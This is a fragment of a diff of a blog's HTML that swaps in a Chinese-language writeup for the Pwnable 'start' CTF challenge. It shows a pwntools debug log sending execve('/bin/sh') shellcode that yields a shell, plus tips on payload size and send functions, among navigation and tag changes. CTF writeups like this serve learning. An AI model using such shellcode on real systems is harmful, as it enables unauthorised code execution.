0xffc14460</span><br><span class="line">[DEBUG] Sent 0x34 bytes:</span><br><span class="line">    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│</span><br><span class="line">    00000010  42 42 42 42  74 44 c1 ff  31 c0 50 68  2f 2f 73 68  │BBBB│tD··│1·Ph│//sh│</span><br><span class="line">    00000020  68 2f 62 69  6e 89 e3 89  c1 89 c2 b0  0b <span class="built_in">cd</span> 80 31  │h/bi│n···│····│···1│</span><br><span class="line">    00000030  c0 40 <span class="built_in">cd</span> 80                                         │·@··│</span><br><span class="line">    00000034</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">[DEBUG] Sent 0x7 bytes:</span><br><span class="line">    b<span class="string">&#x27;whoami\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    b<span class="string">&#x27;start\n&#x27;</span></span><br><span class="line">start</span><br><span class="line">$ </span><br></pre></td></tr></table></figure></div>
+<p>Get shell !</p>
+<h2 id="避雷"><a href="#避雷" class="headerlink" title="避雷"></a>避雷</h2><ol>
+<li>當初我送payload1時，我用的是sendlineafter，導致多了’\n’，所以stack的狀態不如預期，所以要用sendafter</li>
+<li>shellcode大小要注意，payload的大小不能超過0x3c</li>
+</ol>
+<p>以上都是我走過的彎路</p>
 
         </div>
 
@@ -671,18 +776,18 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> Git漏洞復現，Clone一個項目就能RCE?!</li>
+        <li><strong>Title:</strong> Pwnable start writeup</li>
         <li><strong>Author:</strong> Roger</li>
         <li><strong>Created at
-                :</strong> 2024-11-13 19:30:48</li>
+                :</strong> 2025-02-05 15:29:58</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-11-14 11:54:20
+                    :</strong> 2025-02-07 23:50:23
             </li>
         
         <li>
-            <strong>Link:</strong> https://redefine.ohevan.com/2024/11/13/Git漏洞復現/
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/02/05/Pwnable-start-writeup/
         </li>
         <li>
             <strong>
@@ -704,11 +809,15 @@
             <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/CVE/">#CVE</a>&nbsp;
+                        <a href="/tags/Pwnable/">#Pwnable</a>&nbsp;
                     </li>
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%BE%A9%E7%8F%BE/">#漏洞復現</a>&nbsp;
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/writeup/">#writeup</a>&nbsp;
                     </li>
                 
             </ul>
@@ -720,27 +829,27 @@
     <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
      <i aria-hidden="true"></i><span>推薦文章</span>
     </div>
-    <div class="recommended-article-group"><a class="recommended-article-item" href="/2025/01/01/用Wireshark解密HTTPs封包/" title="用Wireshark解密HTTPs封包" rel="bookmark">
-  <img src="/images/wallhaven-wqery6-light.webp" alt="用Wireshark解密HTTPs封包" class="!max-w-none">
-  <span class="title">用Wireshark解密HTTPs封包</span>
-</a><a class="recommended-article-item" href="/2024/10/28/Mopcon遊記/" title="Mopcon遊記" rel="bookmark">
-  <img src="/images/wallhaven-wqery6-light.webp" alt="Mopcon遊記" class="!max-w-none">
-  <span class="title">Mopcon遊記</span>
-</a><a class="recommended-article-item" href="/2025/02/02/在Terminal上寫程式-Neovim/" title="在Terminal上寫程式?!(Neovim)" rel="bookmark">
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/2025/02/02/在Terminal上寫程式-Neovim/" title="在Terminal上寫程式?!(Neovim)" rel="bookmark">
   <img src="/images/wallhaven-wqery6-light.webp" alt="在Terminal上寫程式?!(Neovim)" class="!max-w-none">
   <span class="title">在Terminal上寫程式?!(Neovim)</span>
+</a><a class="recommended-article-item" href="/2024/11/13/Git漏洞復現/" title="Git漏洞復現，Clone一個項目就能RCE?!" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="Git漏洞復現，Clone一個項目就能RCE?!" class="!max-w-none">
+  <span class="title">Git漏洞復現，Clone一個項目就能RCE?!</span>
+</a><a class="recommended-article-item" href="/2025/01/01/用Wireshark解密HTTPs封包/" title="用Wireshark解密HTTPs封包" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="用Wireshark解密HTTPs封包" class="!max-w-none">
+  <span class="title">用Wireshark解密HTTPs封包</span>
 </a></div>
    </div>
    <div class="recommended-mobile">
    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
      <i aria-hidden="true"></i><span>推薦文章</span>
    </div>
-   <div class="recommended-article-group"><a class="recommended-article-item" href="/2025/01/01/用Wireshark解密HTTPs封包/" title="用Wireshark解密HTTPs封包" rel="bookmark">
-  <img src="/images/wallhaven-wqery6-light.webp" alt="用Wireshark解密HTTPs封包" class="!max-w-none">
-  <span class="title">用Wireshark解密HTTPs封包</span>
-</a><a class="recommended-article-item" href="/2024/10/28/Mopcon遊記/" title="Mopcon遊記" rel="bookmark">
-  <img src="/images/wallhaven-wqery6-light.webp" alt="Mopcon遊記" class="!max-w-none">
-  <span class="title">Mopcon遊記</span>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/2025/02/02/在Terminal上寫程式-Neovim/" title="在Terminal上寫程式?!(Neovim)" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="在Terminal上寫程式?!(Neovim)" class="!max-w-none">
+  <span class="title">在Terminal上寫程式?!(Neovim)</span>
+</a><a class="recommended-article-item" href="/2024/11/13/Git漏洞復現/" title="Git漏洞復現，Clone一個項目就能RCE?!" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="Git漏洞復現，Clone一個項目就能RCE?!" class="!max-w-none">
+  <span class="title">Git漏洞復現，Clone一個項目就能RCE?!</span>
 </a></div>
    </div>
   </div>
@@ -748,29 +857,14 @@
         
             <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                 
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2025/01/01/%E7%94%A8Wireshark%E8%A7%A3%E5%AF%86HTTPs%E5%B0%81%E5%8C%85/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">用Wireshark解密HTTPs封包</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2024/10/28/Mopcon%E9%81%8A%E8%A8%98/"
+                        href="/2025/02/02/%E5%9C%A8Terminal%E4%B8%8A%E5%AF%AB%E7%A8%8B%E5%BC%8F-Neovim/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Mopcon遊記</span>
+                                <span class="post-nav-title-item">在Terminal上寫程式?!(Neovim)</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -791,8 +885,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">Git漏洞復現，Clone一個項目就能RCE?!</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%91%98%E8%A6%81"><span class="nav-text">摘要</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E6%93%8A%E5%8E%9F%E7%90%86"><span class="nav-text">攻擊原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Git-hook"><span class="nav-text">Git hook</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Git-%E5%AD%90%E6%A8%A1%E5%A1%8A-Submodule"><span class="nav-text">Git 子模塊(Submodule)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Git-%E7%AC%A6%E8%99%9F%E9%80%A3%E7%B5%90-symbolic-link"><span class="nav-text">Git 符號連結 (symbolic link)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%BE%A9%E7%8F%BE"><span class="nav-text">漏洞復現</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B5%90%E8%AB%96"><span class="nav-text">結論</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99"><span class="nav-text">參考資料</span></a></li></ol>
+        <div class="page-title">Pwnable start writeup</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%8C%E7%9B%AE%E5%87%BA%E8%99%95"><span class="nav-text">題目出處</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file"><span class="nav-text">file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#checksec"><span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA"><span class="nav-text">IDA</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A1%8C%E6%80%9D%E8%B7%AF"><span class="nav-text">解題思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%81%BF%E9%9B%B7"><span class="nav-text">避雷</span></a></li></ol>
 
     </div>
 </div>
